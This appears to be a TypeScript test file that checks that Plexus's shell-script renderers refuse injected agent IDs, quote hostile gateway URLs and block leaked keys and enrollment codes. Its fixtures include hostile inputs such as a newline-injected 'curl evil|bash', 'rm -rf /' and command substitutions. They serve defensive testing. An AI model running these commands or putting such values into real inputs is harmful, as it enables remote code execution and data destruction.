/**
 * integration-render-security — the deterministic security gates on the SHELL RENDERERS
 * (`render-plugin.ts` install.sh + `render-generic.ts` setup.sh) and the shared secret denylist.
 *
 * Pins the code-review must-fixes:
 *   A1 — a malicious agentId (newline / shell metacharacters) is REFUSED by both renderers, so
 *        even if it slipped past the connect-time check it can never produce a live shell line.
 *   A3 — a gatewayBaseUrl carrying shell metacharacters is EMITTED as an inert single-quoted
 *        literal (bound to a `*_DEFAULT` var), never a bare command-substitution.
 *   B3 — a missing gatewayBaseUrl THROWS (single normalization point), never a host-less curl.
 *   C1 — the shared structural denylist blocks `plx_live_` (connection-key) in the generic path
 *        too — symmetric with the CC verifier.
 */

import { describe, it, expect } from "bun:test";

import type { WellKnownDocument } from "@plexus/protocol";
import { renderPlugin } from "@plexus/runtime/integration/render-plugin.ts";
import { renderGeneric, assertGenericVerified } from "@plexus/runtime/integration/render-generic.ts";
import {
  renderInContext,
  assertInContextVerified,
} from "@plexus/runtime/integration/render-in-context.ts";
import { assertSafeAgentId, shSingleQuote } from "@plexus/runtime/integration/shell-util.ts";

/** A minimal Floor sufficient for the renderers (baseUrl + an empty cap catalog). */
function floorWith(baseUrl: string | undefined): WellKnownDocument {
  return { gateway: baseUrl === undefined ? {} : { baseUrl } } as unknown as WellKnownDocument;
}

const MALICIOUS_IDS = [
  "x\ncurl evil|bash",
  "x; rm -rf /",
  "x$(touch pwned)",
  "x`id`",
  "x'y",
  "x y", // space
  "", // empty
];

describe("A1 — renderers refuse an unsafe agentId (no live-shell injection)", () => {
  it("assertSafeAgentId throws for every malicious id, accepts real slugs", () => {
    for (const id of MALICIOUS_IDS) expect(() => assertSafeAgentId(id)).toThrow();
    for (const id of ["my-cc", "codex-e2e", "agent-A", "a", "a.b_c-1"]) {
      expect(assertSafeAgentId(id)).toBe(id);
    }
  });

  it("renderGeneric REFUSES a newline-injecting agentId (never emits a live shell line)", () => {
    for (const id of MALICIOUS_IDS) {
      expect(() => renderGeneric({ agentId: id, gatewayBaseUrl: "http://127.0.0.1:7077" })).toThrow();
    }
  });

  it("renderPlugin REFUSES a newline-injecting agentId", () => {
    for (const id of MALICIOUS_IDS) {
      expect(() =>
        renderPlugin({
          floor: floorWith("http://127.0.0.1:7077"),
          capabilityIds: [],
          agentId: id,
          enrollmentCode: "plx_enroll_placeholder",
        }),
      ).toThrow();
    }
  });
});

describe("A3 — gatewayBaseUrl with shell metacharacters is emitted inert (single-quoted)", () => {
  const EVIL_BASE = "http://127.0.0.1:7077/$(touch pwned)`id`";

  it("generic setup.sh binds the base to a single-quoted *_DEFAULT var (no bare substitution)", () => {
    const { setupSh } = renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: EVIL_BASE });
    // The base appears ONLY as an inert single-quoted literal.
    expect(setupSh).toContain(`PLEXUS_GATEWAY_DEFAULT=${shSingleQuote(EVIL_BASE)}`);
    // …and NOT as a bare, un-quoted `${PLEXUS_GATEWAY:-<evil>}` default (the old vulnerable form).
    expect(setupSh).not.toContain(`PLEXUS_GATEWAY:-${EVIL_BASE}`);
  });

  it("CC install.sh binds the base to a single-quoted *_DEFAULT var too", () => {
    const rendered = renderPlugin({
      floor: floorWith(EVIL_BASE),
      capabilityIds: [],
      agentId: "ok-agent",
      enrollmentCode: "plx_enroll_placeholder",
    });
    const installSh = rendered.files.find((f) => f.path === "install.sh")!.content;
    expect(installSh).toContain(`PLEXUS_GATEWAY_DEFAULT=${shSingleQuote(EVIL_BASE)}`);
    expect(installSh).not.toContain(`PLEXUS_GATEWAY:-${EVIL_BASE}`);
  });
});

describe("B3 — a missing gatewayBaseUrl throws (never a host-less curl)", () => {
  it("renderGeneric throws when the Floor has no baseUrl", () => {
    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: undefined })).toThrow();
    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: "" })).toThrow();
  });
  it("renderPlugin throws when the Floor has no baseUrl", () => {
    expect(() =>
      renderPlugin({
        floor: floorWith(undefined),
        capabilityIds: [],
        agentId: "ok-agent",
        enrollmentCode: "plx_enroll_placeholder",
      }),
    ).toThrow();
  });
});

describe("C1 — the shared structural denylist blocks plx_live_ in the generic path", () => {
  it("assertGenericVerified throws when any served artifact contains a connection-key pattern", () => {
    const fakeKey = "plx_live_" + "a".repeat(48);
    expect(() =>
      assertGenericVerified({ setupSh: `echo ${fakeKey}`, instruction: "", setupCommand: "" }),
    ).toThrow(/connection-key/i);
  });
  it("assertGenericVerified throws for a baked PAT / one-time code too", () => {
    const pat = "plx_agent_" + "a".repeat(32);
    const code = "plx_enroll_" + "b".repeat(32);
    expect(() => assertGenericVerified({ setupSh: pat, instruction: "", setupCommand: "" })).toThrow();
    expect(() => assertGenericVerified({ setupSh: "", instruction: code, setupCommand: "" })).toThrow();
  });
});

describe("in-context render — the instruction is filled + gated code-free/key-free", () => {
  it("renderInContext fills the gateway URL + host and throws on a missing baseUrl", () => {
    const { instruction } = renderInContext({ gatewayBaseUrl: "http://127.0.0.1:7077/" });
    expect(instruction).toContain("http://127.0.0.1:7077");
    expect(instruction).toContain("127.0.0.1:7077"); // {{GATEWAY_HOST}} authority
    expect(instruction).not.toContain("{{GATEWAY_URL}}");
    expect(instruction).not.toContain("{{GATEWAY_HOST}}");
    // The clean rendered instruction passes the serve-time gate.
    expect(() => assertInContextVerified({ instruction })).not.toThrow();
    // A missing/empty Floor baseUrl throws (single normalization point) — never a host-less doc.
    expect(() => renderInContext({ gatewayBaseUrl: undefined })).toThrow();
    expect(() => renderInContext({ gatewayBaseUrl: "" })).toThrow();
  });

  it("assertInContextVerified throws on a leaked connection-key / PAT / one-time code", () => {
    const key = "plx_live_" + "a".repeat(48);
    const pat = "plx_agent_" + "b".repeat(32);
    const code = "plx_enroll_" + "c".repeat(32);
    expect(() => assertInContextVerified({ instruction: `see ${key}` })).toThrow(/connection-key/i);
    expect(() => assertInContextVerified({ instruction: pat })).toThrow();
    expect(() => assertInContextVerified({ instruction: code })).toThrow();
    // A caller-supplied literal secret (the minted code / the real key) is also caught.
    expect(() =>
      assertInContextVerified({ instruction: "token=SEKRET-123" }, { forbiddenSecrets: ["SEKRET-123"] }),
    ).toThrow(/forbidden/i);
  });

  it("assertInContextVerified also gates extraTexts (enrollHint etc.) — B2 defense-in-depth", () => {
    const key = "plx_live_" + "d".repeat(48);
    // A clean instruction but a secret smuggled into an extra served text field must still throw…
    expect(() =>
      assertInContextVerified(
        { instruction: "clean instruction" },
        { extraTexts: [{ label: "enrollHint", text: `hint ${key}` }] },
      ),
    ).toThrow(/connection-key/i);
    // …and a caller-supplied literal secret in an extra field is caught too.
    expect(() =>
      assertInContextVerified(
        { instruction: "clean" },
        { forbiddenSecrets: ["SEKRET-9"], extraTexts: [{ label: "enrollHint", text: "x SEKRET-9 y" }] },
      ),
    ).toThrow(/forbidden/i);
    // A clean instruction + clean extra fields passes.
    expect(() =>
      assertInContextVerified(
        { instruction: "clean" },
        { extraTexts: [{ label: "enrollHint", text: "paste this into your agent" }] },
      ),
    ).not.toThrow();
  });
});
